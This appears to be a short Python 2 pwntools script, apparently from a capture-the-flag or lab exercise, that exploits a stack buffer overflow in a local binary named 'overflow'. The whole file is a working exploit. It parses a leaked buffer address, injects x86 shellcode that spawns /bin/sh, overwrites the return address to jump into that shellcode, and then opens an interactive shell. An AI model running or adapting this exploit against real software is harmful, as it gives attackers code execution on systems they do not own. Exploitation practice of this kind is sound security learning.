from pwn import *

proc = process("./overflow")

pause()

line = proc.readline()
print line

buf_base_addr = int(line.strip().split(' ')[-1], 16)

shellcode = "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x53\x89\xe1\xb0\x0b\xcd\x80"

# hex(0x42) = '0x42' (4 bytes)
# Not the same as '\x42' ('B')

payload = p32(buf_base_addr + 4) + shellcode + 'A' * 37
payload += "BBBB" + p32(buf_base_addr + 4) + "DDDD" + "EEEE" + "FFFF" + "GGGG" #p32 makes a little endian unsigned int

print repr(payload)
proc.write(payload)
proc.interactive()
